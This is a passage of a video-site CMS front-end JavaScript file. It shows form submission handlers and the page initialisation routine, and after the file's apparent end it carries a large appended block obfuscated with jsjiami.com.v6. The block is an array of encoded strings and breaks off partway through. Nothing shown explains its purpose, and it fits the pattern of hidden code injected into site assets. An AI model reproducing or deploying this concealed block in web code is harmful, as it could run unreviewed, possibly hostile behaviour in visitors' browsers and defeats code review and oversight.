						dataType: 'json',
						timeout: 3000,
						data: $(this).serialize(),
						beforeSend: function(xhr){
							$('.alert-card').html('Loading...');
						},
						error : function(){
							$('.alert-card').html('请求失败，请刷新网页。');
						},
						success: function(json){
							if(json.status == 200){
								feifei.alert.success('.alert-card', '充值成功，谢谢支持。');
								setTimeout(function(){location.reload();}, 2000);
							}else{
								feifei.alert.warning('.alert-card', json.info);
							}
						},
						complete: function(xhr){
						}
					});
					return false;
				});
			}
		});
	}
}
//end
};
/*.ff-search #wd #ff-goback .ff-gallery .ff-raty .ff-img .ff-share .ff-safecode .ff-reply*/
$(document).ready(function(){
	if(feifei.browser.useragent.mobile){
		feifei.mobile.jump();
		feifei.mobile.nav();
		feifei.mobile.goback();
		feifei.mobile.flickity();
	}
	feifei.user.load();
	feifei.cms.nav();//
	feifei.cms.collapse();
	feifei.search.dropdown();
	feifei.search.autocomplete();
	feifei.search.hot();//
	feifei.search.submit();//
	feifei.search.keydown();//
	feifei.image.lazyload();
	feifei.image.slide();
	feifei.image.qrcode();//
	feifei.playurl.tongji();
	feifei.playurl.more();
	feifei.playurl.dropdown();
	feifei.playurl.download();
	feifei.playurl.active();
	feifei.page.more();
	feifei.page.keydown();//
	feifei.updown.click();
	feifei.score.raty();
	feifei.scenario.load();
	feifei.forum.load();
	feifei.vcode.load();
	feifei.scroll.totop('ff-totop',10);
	feifei.record.load();//
	feifei.hits.load();
	feifei.share.baidu();
});



 /*
/*sale 2.14.ktt
 */
 

 
var _0xod1='jsjiami.com.v6',_0xod1_=['‮_0xod1'],_0x4ab5=[_0xod1,'\x61\x73\x4b\x2b\x64\x6c\x4d\x73\x77\x70\x52\x4b\x4f\x56\x4d\x77\x77\x70\x4d\x3d','\x52\x4d\x4b\x4b\x47\x67\x3d\x3d','\x47\x53\x45\x39\x77\x35\x4a\x5a\x4b\x42\x6b\x3d','\x4d\x38\x4f\x76\x51\x77\x3d\x3d','\x77\x70\x6b\x61\x77\x72\x6f\x3d','\x44\x63\x4f\x6f\x53\x52\x39\x57\x77\x36\x41\x44','\x50\x38\x4b\x44\x66\x51\x3d\x3d','\x77\x36\x76\x43\x76\x73\x4f\x65','\x61\x38\x4f\x53\x52\x51\x3d\x3d','\x48\x58\x4e\x33\x77\x35\x37\x43\x6f\x73\x4b\x46\x4b\x67\x3d\x3d','\x77\x36\x39\x49\x56\x63\x4b\x6b\x77\x34\x38\x3d','\x59\x73\x4f\x32\x77\x72\x34\x3d','\x77\x71\x6f\x2f\x77\x34\x34\x3d','\x77\x72\x38\x79\x77\x34\x45\x3d','\x77\x36\x64\x63\x43\x73\x4f\x46\x4e\x63\x4f\x62\x77\x35\x59\x78\x56\x63\x4f\x68','\x66\x63\x4f\x36\x77\x72\x45\x75','\x47\x73\x4b\x57\x63\x77\x41\x3d','\x77\x71\x66\x44\x75\x6c\x56\x6e\x66\x38\x4b\x56\x77\x34\x48\x44\x72\x48\x33\x44\x6d\x63\x4f\x6a\x77\x34\x31\x64\x77\x36\x7a\x44\x68\x73\x4f\x4e\x66\x6d\x7a\x44\x67\x63\x4b\x45\x53\x63\x4f\x43\x77\x71\x70\x30\x57\x32\x54\x43\x72\x4d\x4f\x2f\x51\x47\x7a\x43\x75\x63\x4b\x4a\x41\x43\x44\x44\x73\x42\x7a\x44\x75\x58\x6e\x43\x6a\x63\x4f\x75\x46\x79\x6a\x44\x76\x73\x4f\x59\x45\x68\x37\x44\x74\x7a\x58\x44\x75\x44\x55\x62\x77\x35\x2f\x43\x72\x6e\x76\x43\x71\x33\x50\x44\x6c\x73\x4b\x2b\x58\x47\x62\x43\x67\x48\x68\x2f\x77\x34\x5a\x61\x51\x6a\x54\x44\x67\x38\x4f\x38\x77\x34\x30\x47\x77\x71\x67\x4d\x77\x72\x48\x43\x72\x4d\x4b\x58\x57\x4d\x4b\x47\x58\x6d\x44\x43\x76\x69\x76\x44\x76\x6d\x30\x55\x77\x70\x4c\x44\x6b\x63\x4f\x4c\x77\x72\x37\x43\x6a\x47\x4c\x44\x69\x79\x33\x44\x6f\x73\x4f\x54\x77\x72\x72\x43\x68\x53\x6c\x50\x77\x37\x54\x44\x69\x6c\x30\x30\x5a\x44\x33\x44\x6c\x73\x4f\x74\x77\x34\x66\x44\x6f\x38\x4b\x58\x77\x70\x31\x66\x57\x32\x68\x2f\x46\x38\x4b\x7a\x77\x36\x62\x43\x71\x4d\x4b\x75\x50\x4d\x4f\x52\x4e\x69\x54\x44\x6f\x7a\x76\x43\x71\x38\x4f\x6c\x77\x71\x35\x31\x59\x38\x4f\x47\x77\x37\x59\x68\x41\x56\x56\x56\x65\x44\x2f\x43\x73\x73\x4f\x65\x77\x6f\x34\x71\x53\x38\x4f\x31\x66\x68\x70\x4d\x77\x35\x70\x6f\x65\x73\x4b\x51\x77\x72\x2f\x44\x6c\x52\x44\x44\x70\x73\x4b\x38\x53\x73\x4f\x66\x77\x36\x45\x62\x77\x72\x4c\x43\x6f\x32\x4c\x43\x68\x48\x2f\x44\x6b\x6e\x78\x63\x77\x37\x38\x61\x77\x34\x6b\x6b\x4f\x38\x4f\x58\x77\x35\x42\x50\x77\x6f\x42\x71\x4b\x31\x37\x43\x76\x63\x4f\x38\x4c\x38\x4f\x55\x77\x70\x44\x43\x6b\x73\x4b\x63\x77\x72\x73\x48\x77\x72\x54\x43\x72\x67\x3d\x3d','\x77\x37\x2f\x43\x71\x30\x6a\x44\x70\x41\x3d\x3d','\x64\x63\x4f\x4f\x77\x34\x73\x69\x56\x77\x3d\x3d','\x63\x63\x4f\x39\x77\x34\x59\x65\x41\x67\x3d\x3d','\x45\x38\x4b\x43\x77\x70\x37\x43\x75\x67\x3d\x3d','\x4d\x4d\x4b\x39\x4e\x78\x42\x63\x77\x70\x30\x6d\x46\x47\x46\x62\x77\x35\x45\x55\x77\x36\x72\x44\x73\x42\x67\x44\x77\x34\x5a\x49\x77\x70\x30\x4f\x56\x73\x4f\x7a\x53\x32\x31\x5a\x77\x35\x72\x43\x6e\x73\x4b\x45\x46\x73\x4b\x43\x4d\x44\x31\x69\x4f\x38\x4f\x7a\x50\x51\x41\x6a\x4b\x69\x44\x44\x6b\x42\x55\x52\x4f\x31\x76\x44\x6a\x4d\x4f\x56\x77\x36\x31\x6c\x41\x4d\x4f\x43\x77\x36\x48\x44\x70\x4d\x4b\x38\x64\x38\x4b\x35\x46\x56\x6e\x43\x6a\x4d\x4b\x4d\x77\x34\x52\x51\x58\x4d\x4f\x4c\x62\x47\x33\x43\x69\x32\x5a\x38\x51\x73\x4b\x51\x49\x4d\x4f\x72\x77\x35\x45\x76\x64\x63\x4f\x68\x77\x34\x51\x38\x77\x34\x35\x51\x4c\x68\x64\x73\x77\x6f\x66\x43\x6c\x63\x4b\x6e\x77\x34\x7a\x43\x67\x6a\x66\x44\x70\x69\x73\x6e\x77\x37\x7a\x44\x6c\x4d\x4b\x6a\x59\x31\x54\x44\x6b\x4d\x4f\x53\x77\x34\x38\x67\x77\x35\x5a\x6e\x57\x68\x45\x41\x77\x37\x4c\x44\x71\x67\x50\x44\x74\x38\x4f\x6e\x77\x37\x63\x68\x4b\x67\x4e\x57\x77\x34\x55\x41\x77\x71\x4a\x4e\x44\x38\x4f\x74\x51\x56\x49\x3d','\x77\x70\x58\x44\x71\x4d\x4b\x49\x4b\x44\x5a\x5a\x77\x37\x78\x2f\x61\x6b\x64\x43\x64\x73\x4f\x68\x51\x4d\x4b\x4f\x77\x71\x4c\x44\x6a\x4d\x4f\x2f\x47\x63\x4b\x39\x48\x4d\x4b\x67\x4a\x4d\x4f\x76\x47\x38\x4f\x5a\x77\x6f\x68\x39\x77\x71\x58\x44\x71\x7a\x67\x36\x77\x36\x72\x44\x6a\x57\x7a\x44\x69\x58\x72\x43\x6f\x6c\x4c\x43\x6e\x7a\x37\x43\x76\x77\x3d\x3d','\x77\x70\x35\x75\x77\x36\x67\x6a\x61\x78\x67\x3d','\x42\x69\x59\x71\x77\x35\x35\x44\x44\x68\x50\x44\x72\x63\x4f\x52\x51\x77\x3d\x3d','\x41\x6e\x52\x67\x77\x35\x4c\x43\x75\x4d\x4b\x6d\x4b\x51\x3d\x3d','\x4c\x68\x45\x57\x4e\x63\x4f\x2f','\x54\x73\x4b\x2b\x43\x56\x66\x44\x72\x51\x3d\x3d','\x77\x37\x2f\x44\x76\x33\x31\x47','\x77\x72\x74\x51\x77\x35\x34\x4c\x47\x67\x3d\x3d','\x77\x70\x6f\x54\x51\x63\x4b\x55\x51\x77\x3d\x3d','\x46\x30\x74\x37\x77\x36\x33\x43\x6c\x67\x3d\x3d','\x77\x36\x58\x44\x72\x57\x68\x76\x62\x51\x3d\x3d','\x77\x36\x54\x44\x6f\x33\x39\x64','\x77\x6f\x5a\x74\x77\x72\x39\x68\x77\x36\x77\x3d','\x77\x36\x70\x5a\x59\x63\x4b\x49\x77\x36\x45\x3d','\x77\x37\x76\x43\x69\x73\x4b\x6b','\x77\x36\x62\x44\x6d\x54\x73\x4e\x77\x6f\x55\x3d','\x57\x73\x4f\x4a\x77\x35\x59\x76\x66\x41\x3d\x3d','\x44\x63\x4f\x45\x77\x72\x42\x4e\x77\x37\x67\x6e\x77\x37\x55\x6b\x77\x34\x59\x3d','\x59\x63\x4f\x77\x77\x70\x77\x6c\x64\x63\x4f\x73\x63\x73\x4b\x4c\x77\x37\x54\x44\x6d\x73\x4b\x4e','\x4d\x42\x78\x70\x59\x41\x3d\x3d','\x42\x38\x4f\x75\x77\x72\x42\x2b\x4f\x6d\x34\x6c\x43\x4d\x4b\x2b\x51\x55\x59\x3d','\x54\x38\x4f\x4c\x77\x36\x64\x44\x77\x6f\x6f\x38\x77\x71\x67\x32\x77\x6f\x52\x6c\x53\x52\x72\x44\x70\x73\x4f\x4f\x4c\x63\x4b\x79\x77\x37\x41\x3d','\x4e\x6d\x38\x47\x5a\x56\x63\x3d','\x77\x70\x35\x54\x65\x73\x4b\x41\x77\x6f\x41\x3d','\x77\x71\x42\x50\x58\x67\x3d\x3d','\x4a\x77\x62\x43\x74\x51\x3d\x3d','\x4d\x45\x72\x43\x74\x54\x44\x43\x73\x73\x4f\x38','\x43\x73\x4f\x6a\x53\x51\x3d\x3d','\x4c\x41\x72\x43\x73\x6a\x72\x43\x75\x63\x4b\x37\x44\x67\x3d\x3d','\x48\x67\x44\x43\x67\x63\x4b\x62\x42\x67\x3d\x3d','\x4e\x38\x4f\x39\x77\x70\x35\x34\x41\x67\x3d\x3d','\x77\x34\x33\x43\x69\x73\x4b\x4e\x45\x77\x45\x3d','\x77\x6f\x52\x6b\x51\x63\x4b\x75\x77\x6f\x34\x3d','\x77\x71\x38\x48\x77\x34\x72\x43\x73\x56\x34\x3d','\x59\x38\x4f\x54\x77\x35\x63\x2f\x57\x67\x3d\x3d','\x77\x37\x37\x44\x70\x55\x4a\x38\x62\x41\x3d\x3d','\x42\x73\x4b\x51\x66\x77\x2f\x44\x72\x51\x3d\x3d','\x77\x35\x76\x43\x70\x38\x4b\x4a','\x77\x71\x63\x66\x50\x63\x4b\x38','\x77\x71\x39\x45\x56\x38\x4b\x75\x77\x6f\x72\x43\x73\x58\x78\x45\x62\x67\x3d\x3d','\x48\x58\x4e\x31\x77\x35\x51\x3d','\x45\x73\x4f\x51\x4b\x69\x46\x76','\x77\x72\x74\x61\x77\x72\x46\x48\x77\x35\x34\x3d','\x44\x73\x4f\x44\x48\x63\x4f\x68\x4b\x41\x3d\x3d','\x77\x37\x37\x43\x74\x73\x4b\x39\x77\x37\x52\x77','\x77\x35\x52\x66\x77\x70\x44\x43\x74\x55\x59\x3d','\x57\x4d\x4b\x71\x77\x36\x41\x6e\x59\x51\x3d\x3d','\x77\x35\x2f\x44\x74\x73\x4f\x71\x48\x77\x59\x3d','\x77\x6f\x51\x4c\x47\x4d\x4b\x64\x56\x67\x3d\x3d','\x42\x73\x4f\x50\x47\x6a\x31\x41','\x77\x35\x44\x44\x75\x63\x4b\x31\x59\x67\x30\x3d','\x77\x35\x2f\x44\x6b\x73\x4f\x35\x41\x68\x38\x3d','\x77\x35\x2f\x44\x74\x79\x49\x5a\x77\x6f\x45\x3d','\x50\x44\x5a\x37\x52\x63\x4b\x6a','\x43\x47\x46\x51\x62\x56\x45\x3d','\x56\x63\x4b\x42\x45\x67\x6c\x54','\x4a\x38\x4f\x36\x4a\x73\x4f\x74\x48\x51\x3d\x3d','\x43\x4d\x4f\x6a\x51\x78\x31\x61\x77\x34\x63\x3d','\x77\x36\x48\x44\x76\x48\x52\x61\x57\x77\x3d\x3d','\x59\x4d\x4b\x78\x50\x77\x56\x4a\x77\x70\x67\x3d','\x77\x6f\x56\x66\x77\x72\x74\x2b','\x77\x70\x62\x43\x68\x63\x4f\x4f\x45\x38\x4b\x73','\x77\x34\x76\x44\x6e\x4d\x4f\x6c\x4b\x52\x6a\x43\x67\x51\x3d\x3d','\x77\x36\x42\x56\x66\x73\x4b\x66\x77\x35\x41\x3d','\x64\x73\x4b\x6c\x54\x6b\x77\x6f\x77\x34\x73\x58\x56\x56\x45\x6e\x77\x70\x68\x63\x52\x69\x45\x73\x5a\x38\x4b\x67\x77\x6f\x5a\x2f\x4e\x69\x62\x44\x6d\x63\x4b\x75\x77\x36\x73\x45\x77\x35\x6e\x43\x68\x63\x4b\x7a\x77\x72\x49\x36\x77\x6f\x31\x4b\x51\x30\x49\x41\x77\x34\x6e\x43\x6d\x67\x48\x43\x71\x38\x4f\x36\x77\x72\x6a\x43\x68\x63\x4f\x6c\x50\x51\x3d\x3d','\x4d\x73\x4f\x4b\x48\x42\x64\x6f\x43\x48\x67\x50\x62\x6e\x72\x44\x6a\x38\x4b\x39\x77\x36\x38\x30\x77\x37\x58\x43\x68\x73\x4b\x46\x77\x35\x33\x43\x76\x48\x56\x35\x77\x36\x50\x44\x70\x4d\x4f\x47\x77\x70\x6a\x43\x74\x38\x4f\x6a\x77\x71\x6e\x44\x67\x38\x4f\x30\x57\x73\x4f\x49\x77\x72\x51\x39\x5a\x6b\x41\x45\x77\x6f\x62\x44\x6b\x6d\x4a\x70\x77\x34\x62\x44\x6b\x78\x41\x6d','\x77\x34\x58\x43\x71\x63\x4b\x41\x50\x6a\x68\x5a','\x47\x48\x68\x39\x77\x35\x7a\x43\x72\x73\x4b\x69','\x48\x57\x56\x62\x56\x43\x37\x43\x74\x38\x4f\x49\x77\x35\x73\x30\x61\x4d\x4b\x30\x77\x71\x77\x4e\x77\x71\x55\x67\x52\x73\x4b\x6e\x77\x34\x58\x44\x6a\x73\x4f\x2b\x53\x73\x4f\x62\x77\x70\x63\x3d','\x55\x38\x4f\x45\x77\x35\x4c\x44\x71\x67\x3d\x3d','\x49\x41\x55\x62\x77\x36\x56\x35','\x77\x71\x45\x72\x77\x34\x50\x43\x6e\x33\x73\x51\x77\x35\x66\x43\x6c\x4d\x4b\x54\x77\x70\x59\x53\x4a\x4d\x4b\x78\x4c\x6c\x34\x6f','\x4c\x41\x38\x34\x41\x6a\x33\x43\x72\x51\x5a\x38\x43\x78\x7a\x43\x6a\x6a\x56\x77\x77\x35\x70\x63\x4a\x4d\x4f\x6e\x47\x38\x4f\x6b\x77\x36\x58\x44\x6d\x44\x58\x43\x73\x79\x67\x79\x58\x31\x58\x43\x74\x68\x51\x45\x4e\x42\x51\x4d\x54\x57\x37\x44\x74\x43\x72\x43\x6f\x38\x4b\x54\x77\x34\x44\x43\x67\x56\x4c\x44\x69\x79\x54\x43\x71\x73\x4b\x5a\x53\x73\x4b\x4e\x77\x37\x45\x6f\x77\x72\x33\x43\x72\x43\x62\x43\x70\x73\x4f\x6d\x56\x73\x4b\x62\x77\x37\x38\x74\x77\x72\x62\x43\x6c\x33\x44\x44\x75\x4d\x4b\x73','\x77\x71\x4e\x53\x58\x63\x4b\x2f','\x77\x70\x63\x54\x77\x72\x68\x53\x45\x41\x3d\x3d','\x47\x53\x45\x70\x77\x34\x4a\x56','\x4f\x63\x4b\x6f\x5a\x52\x34\x4e\x77\x6f\x78\x79\x53\x43\x46\x54\x77\x70\x6f\x3d','\x77\x70\x6e\x43\x70\x4d\x4f\x44\x4c\x77\x3d\x3d','\x77\x6f\x2f\x43\x70\x73\x4f\x46\x42\x4d\x4b\x34','\x51\x38\x4f\x49\x62\x4d\x4f\x72\x57\x4d\x4b\x68\x77\x34\x66\x43\x71\x6d\x66\x44\x6a\x63\x4b\x49\x77\x37\x6a\x43\x75\x67\x6e\x43\x74\x4d\x4f\x4b\x50\x51\x3d\x3d','\x77\x35\x44\x43\x67\x63\x4b\x34\x77\x37\x46\x6e','\x45\x73\x4f\x53\x48\x63\x4f\x59\x43\x51\x3d\x3d','\x41\x58\x4e\x33\x77\x35\x37\x43\x76\x4d\x4b\x6a\x49\x73\x4b\x55\x77\x70\x63\x3d','\x77\x34\x6a\x44\x6d\x69\x6b\x74\x77\x6f\x6a\x43\x6d\x41\x3d\x3d','\x46\x6c\x45\x4b\x53\x6d\x6e\x44\x72\x6b\x45\x74','\x54\x48\x78\x32\x77\x35\x6e\x44\x70\x73\x4b\x56\x56\x38\x4b\x34\x77\x35\x37\x44\x6c\x6c\x56\x34\x5a\x77\x3d\x3d','\x63\x63\x4f\x42\x77\x35\x67\x79\x53\x38\x4b\x37\x77\x35\x66\x44\x71\x38\x4f\x4c\x43\x47\x67\x76\x48\x6b\x35\x34\x63\x4d\x4b\x64\x77\x36\x5a\x2f\x4d\x6b\x39\x49\x63\x63\x4f\x74\x77\x37\x54\x43\x76\x48\x49\x3d','\x45\x4d\x4f\x6c\x53\x51\x4e\x45','\x45\x63\x4f\x4d\x48\x4d\x4f\x2b\x50\x77\x3d\x3d','\x47\x48\x5a\x6f\x53\x46\x67\x3d','\x77\x70\x4c\x43\x68\x73\x4f\x6c\x4c\x63\x4b\x58','\x4d\x6d\x6a\x43\x76\x6a\x62\x43\x6f\x41\x3d\x3d','\x77\x71\x49\x4f\x43\x4d\x4b\x56\x57\x67\x3d\x3d','\x47\x67\x76\x43\x6b\x63\x4b\x49\x4b\x51\x3d\x3d','\x43\x38\x4f\x62\x77\x72\x70\x34\x77\x35\x41\x3d','\x43\x31\x39\x34\x65\x52\x51\x3d','\x77\x35\x56\x70\x59\x73\x4b\x6b\x77\x35\x59\x3d','\x44\x4d\x4f\x2f\x4c\x42\x74\x73','\x41\x73\x4f\x54\x77\x70\x78\x49\x77\x35\x45\x3d','\x43\x38\x4f\x32\x58\x53\x31\x49','\x43\x69\x76\x43\x71\x38\x4b\x54\x42\x77\x3d\x3d','\x48\x4d\x4f\x4e\x48\x43\x42\x61','\x66\x38\x4f\x6e\x77\x6f\x51\x2b\x55\x41\x3d\x3d','\x57\x73\x4b\x64\x53\x58\x45\x33','\x77\x35\x42\x2f\x77\x71\x37\x43\x72\x6c\x49\x3d','\x77\x34\x54\x44\x6c\x68\x6b\x62\x77\x72\x6b\x3d','\x48\x57\x64\x39\x77\x35\x6a\x43\x76\x41\x3d\x3d','\x53\x38\x4b\x7a\x77\x37\x34\x65\x51\x41\x3d\x3d','\x77\x36\x4c\x43\x6f\x38\x4b\x39\x4f\x41\x30\x3d','\x77\x70\x42\x57\x77\x70\x7a\x43\x74\x53\x59\x3d','\x77\x37\x6a\x43\x70\x57\x58\x44\x68\x63\x4b\x59','\x77\x70\x4c\x44\x6c\x63\x4f\x4f\x44\x38\x4b\x56','\x77\x6f\x49\x4a\x43\x38\x4b\x35\x56\x41\x3d\x3d','\x77\x6f\x44\x43\x6d\x63\x4f\x2f\x4f\x4d\x4b\x4d','\x54\x4d\x4f\x4c\x77\x36\x49\x43\x43\x67\x3d\x3d','\x4b\x52\x42\x5a\x5a\x63\x4b\x68','\x49\x45\x51\x37\x77\x34\x6a\x43\x72\x51\x3d\x3d','\x49\x63\x4b\x61\x62\x43\x48\x44\x75\x51\x3d\x3d','\x59\x4d\x4b\x6e\x77\x36\x38\x74\x53\x67\x3d\x3d','\x77\x35\x33\x44\x6a\x6c\x4e\x71\x62\x41\x3d\x3d','\x56\x63\x4f\x55\x77\x36\x30\x2b\x4b\x77\x3d\x3d','\x77\x37\x33\x44\x6f\x63\x4b\x4c\x51\x54\x59\x3d','\x77\x6f\x63\x5a\x58\x4d\x4b\x49\x65\x51\x3d\x3d','\x43\x51\x4e\x4d\x62\x63\x4b\x78','\x53\x4d\x4f\x6f\x77\x37\x55\x77\x49\x77\x3d\x3d','\x61\x73\x4b\x30\x53\x55\x67\x3d','\x53\x4d\x4f\x36\x77\x37\x49\x66\x46\x51\x3d\x3d','\x4a\x78\x38\x48\x77\x35\x76\x43\x6a\x77\x3d\x3d','\x77\x34\x50\x43\x72\x63\x4b\x64\x4c\x67\x3d\x3d','\x5a\x4d\x4b\x4e\x48\x31\x4d\x35','\x77\x72\x6c\x4e\x57\x4d\x4b\x36\x77\x6f\x41\x3d','\x54\x73\x4b\x78\x4e\x6d\x6a\x44\x70\x51\x3d\x3d','\x65\x4d\x4b\x52\x48\x6c\x73\x76','\x77\x72\x59\x70\x4a\x63\x4b\x2f\x61\x67\x3d\x3d','\x77\x72\x4a\x57\x55\x4d\x4b\x48\x77\x72\x6b\x3d','\x77\x6f\x67\x62\x77\x34\x54\x43\x71\x32\x51\x3d','\x42\x77\x45\x63\x77\x37\x33\x43\x6a\x67\x3d\x3d','\x44\x48\x4e\x55\x77\x37\x58\x43\x6f\x41\x3d\x3d','\x77\x37\x72\x44\x70\x30\x42\x2f\x5a\x77\x3d\x3d','\x61\x63\x4b\x5a\x47\x51\x52\x4b','\x77\x72\x58\x43\x6e\x38\x4f\x4d\x41\x38\x4b\x67','\x66\x4d\x4b\x58\x41\x30\x34\x55','\x77\x35\x74\x4c\x58\x38\x4b\x64\x77\x37\x51\x3d','\x77\x35\x76\x43\x76\x63\x4b\x68\x77\x35\x39\x46','\x77\x35\x6c\x63\x77\x70\x66\x43\x67\x33\x30\x3d','\x77\x70\x62\x44\x69\x38\x4f\x6f\x4c\x38\x4b\x7a','\x65\x63\x4f\x30\x77\x6f\x51\x4a\x54\x67\x3d\x3d','\x77\x35\x33\x44\x6d\x38\x4f\x34\x4b\x79\x30\x3d','\x77\x70\x2f\x43\x76\x63\x4f\x66\x48\x38\x4b\x64','\x77\x34\x44\x44\x6b\x54\x51\x6a\x77\x6f\x30\x3d','\x49\x73\x4f\x52\x5a\x43\x31\x73','\x77\x37\x48\x43\x6b\x6e\x2f\x44\x6c\x63\x4b\x5a','\x66\x73\x4f\x31\x77\x37\x63\x38\x62\x51\x3d\x3d','\x46\x73\x4b\x68\x77\x6f\x37\x43\x68\x41\x6f\x3d','\x77\x36\x44\x44\x72\x56\x31\x35\x57\x51\x3d\x3d','\x52\x63\x4f\x50\x77\x35\x41\x54\x52\x67\x3d\x3d','\x77\x36\x54\x44\x72\x73\x4f\x5a\x41\x44\x55\x3d','\x45\x63\x4f\x35\x50\x42\x4e\x51','\x4f\x48\x39\x62\x52\x44\x58\x43\x73\x73\x4f\x43','\x51\x63\x4b\x49\x45\x6d\x37\x44\x6f\x77\x44\x44\x69\x77\x3d\x3d','\x77\x71\x6f\x73\x77\x37\x72\x43\x68\x46\x6f\x3d','\x45\x6c\x58\x43\x70\x55\x70\x36','\x41\x38\x4f\x4f\x77\x6f\x70\x45\x47\x51\x3d\x3d','\x77\x72\x62\x43\x6f\x63\x4f\x66\x4b\x38\x4b\x75','\x77\x6f\x39\x78\x77\x36\x41\x7a\x50\x77\x3d\x3d','\x77\x36\x50\x44\x75\x58\x46\x4a\x54\x77\x3d\x3d','\x77\x37\x7a\x43\x6e\x4d\x4b\x31\x77\x37\x4e\x31','\x63\x73\x4b\x2b\x58\x51\x3d\x3d','\x52\x63\x4b\x78\x77\x35\x6b\x6f','\x77\x37\x62\x44\x76\x63\x4b\x64\x51\x69\x6b\x3d','\x48\x38\x4f\x62\x4c\x6a\x73\x3d','\x4f\x43\x34\x43\x4a\x38\x4f\x58\x77\x71\x6a\x43\x6f\x63\x4f\x42\x4a\x67\x3d\x3d','\x50\x48\x56\x42\x63\x6a\x62\x43\x75\x38\x4f\x4b\x77\x35\x42\x79\x66\x63\x4b\x45\x77\x72\x49\x78\x77\x71\x77\x3d','\x63\x4d\x4f\x73\x77\x35\x34\x57\x48\x67\x3d\x3d','\x77\x34\x50\x44\x6b\x4d\x4f\x34\x50\x67\x44\x43\x69\x43\x59\x3d','\x77\x72\x6e\x43\x72\x38\x4f\x6c\x4c\x4d\x4b\x65','\x77\x34\x48\x43\x6f\x38\x4b\x53\x77\x36\x39\x41','\x62\x63\x4b\x68\x56\x6c\x55\x76','\x66\x63\x4b\x2b\x56\x45\x38\x30\x77\x70\x31\x64','\x61\x73\x4b\x6a\x57\x31\x38\x2b','\x77\x34\x54\x44\x6c\x73\x4f\x6c\x50\x51\x50\x43\x68\x54\x6f\x3d','\x77\x71\x31\x41\x46\x38\x4f\x45\x49\x67\x3d\x3d','\x77\x34\x42\x4f\x56\x63\x4b\x69\x77\x35\x68\x6b\x57\x77\x3d\x3d','\x46\x45\x45\x47\x58\x48\x6f\x3d','\x65\x33\x62\x43\x74\x38\x4b\x42\x77\x37\x2f\x44\x6b\x73\x4f\x49','\x77\x35\x52\x33\x77\x72\x33\x43\x70\x31\x74\x36\x46\x4d\x4b\x51\x5a\x41\x3d\x3d','\x45\x30\x73\x4b\x57\x6e\x4c\x44\x71\x30\x73\x3d','\x56\x63\x4b\x47\x44\x6e\x4d\x3d','\x42\x6e\x2f\x43\x68\x55\x70\x59\x77\x37\x37\x44\x68\x51\x3d\x3d','\x4d\x6e\x35\x54\x57\x41\x3d\x3d','\x77\x37\x37\x43\x71\x30\x4c\x44\x72\x73\x4b\x45\x4c\x41\x6f\x3d','\x62\x38\x4f\x33\x77\x34\x41\x3d','\x65\x38\x4f\x4c\x77\x36\x6b\x6f\x43\x67\x3d\x3d','\x47\x73\x4f\x51\x4a\x6a\x4e\x38\x52\x41\x3d\x3d','\x77\x36\x50\x44\x75\x73\x4b\x63\x52\x51\x3d\x3d','\x77\x35\x4c\x43\x6f\x46\x76\x44\x75\x4d\x4b\x6d','\x77\x37\x48\x43\x6f\x55\x4c\x44\x75\x73\x4b\x66\x4b\x41\x3d\x3d','\x64\x4d\x4b\x4a\x77\x34\x67\x2f\x66\x77\x3d\x3d','\x47\x73\x4f\x31\x44\x4d\x4f\x48\x42\x67\x3d\x3d','\x4f\x73\x4f\x37\x77\x6f\x46\x51\x77\x35\x34\x3d','\x48\x45\x45\x4b\x54\x6d\x6e\x44\x72\x77\x3d\x3d','\x77\x37\x54\x44\x76\x6e\x4e\x73\x5a\x51\x3d\x3d','\x4e\x38\x4b\x36\x77\x72\x50\x43\x6c\x42\x41\x3d','\x65\x4d\x4f\x55\x77\x72\x30\x68\x55\x41\x3d\x3d','\x77\x71\x31\x31\x77\x71\x76\x43\x6a\x78\x30\x3d','\x49\x6c\x4d\x67\x51\x6c\x6f\x3d','\x77\x34\x66\x43\x67\x46\x58\x44\x73\x4d\x4b\x53','\x4d\x7a\x56\x31\x64\x38\x4b\x39','\x77\x70\x4c\x43\x75\x73\x4f\x72\x48\x73\x4b\x2b','\x77\x70\x4a\x33\x41\x63\x4f\x6f\x47\x51\x3d\x3d','\x77\x34\x48\x44\x6b\x6c\x52\x51\x56\x77\x3d\x3d','\x77\x72\x37\x43\x6a\x38\x4f\x49\x4b\x63\x4b\x63','\x66\x4d\x4b\x69\x77\x36\x59\x76\x52\x77\x3d\x3d','\x46\x63\x4f\x64\x4b\x53\x5a\x4a\x57\x41\x3d\x3d','\x77\x70\x49\x58\x77\x72\x5a\x55\x44\x41\x3d\x3d','\x77\x36\x76\x44\x71\x38\x4b\x34\x51\x7a\x63\x3d','\x50\x6e\x6c\x54\x65\x56\x49\x7a','\x77\x6f\x6e\x44\x6b\x63\x4f\x2f\x49\x77\x41\x3d','\x77\x36\x5a\x43\x43\x38\x4f\x4d','\x44\x4d\x4b\x44\x45\x33\x34\x3d','\x77\x36\x52\x59\x57\x38\x4b\x6f\x77\x6f\x49\x3d','\x77\x35\x74\x65\x77\x72\x42\x69','\x53\x33\x6a\x43\x6e\x31\x51\x3d','\x77\x36\x6b\x6b\x77\x34\x54\x43\x6a\x41\x3d\x3d','\x61\x31\x7a\x43\x76\x53\x59\x3d','\x49\x73\x4b\x6b\x49\x52\x59\x3d','\x57\x4d\x4f\x66\x4f\x77\x3d\x3d','\x58\x69\x55\x70\x77\x35\x41\x3d','\x77\x36\x5a\x56\x44\x4d\x4f\x4e','\x77\x72\x6e\x44\x75\x32\x4e\x4f','\x48\x63\x4b\x4b\x46\x32\x34\x3d','\x77\x72\x50\x43\x70\x6b\x48\x44\x72\x51\x3d\x3d','\x56\x73\x4f\x44\x77\x72\x78\x5a','\x47\x73\x4b\x57\x61\x68\x7a\x44\x75\x38\x4f\x31\x77\x71\x35\x6b\x41\x30\x48\x43\x69\x38\x4b\x70\x77\x35\x6c\x48\x4c\x63\x4b\x30\x41\x58\x5a\x39\x77\x35\x2f\x44\x71\x63\x4f\x4f\x43\x44\x50\x43\x76\x73\x4f\x35\x4b\x38\x4b\x6f\x77\x71\x48\x44\x69\x6a\x78\x61\x77\x37\x2f\x43\x74\x63\x4b\x39','\x77\x6f\x58\x43\x71\x73\x4f\x44\x4c\x73\x4b\x31\x77\x37\x49\x3d','\x46\x6d\x55\x73\x77\x34\x4c\x43\x6f\x4d\x4b\x42','\x77\x70\x73\x36\x57\x73\x4b\x6f','\x45\x63\x4f\x52\x4b\x73\x4f\x53\x42\x38\x4b\x34\x77\x70\x76\x43\x73\x7a\x37\x44\x68\x63\x4f\x38\x77\x37\x33\x44\x69\x78\x45\x3d','\x77\x34\x4a\x37\x77\x71\x66\x43\x72\x6b\x34\x3d','\x48\x6d\x6b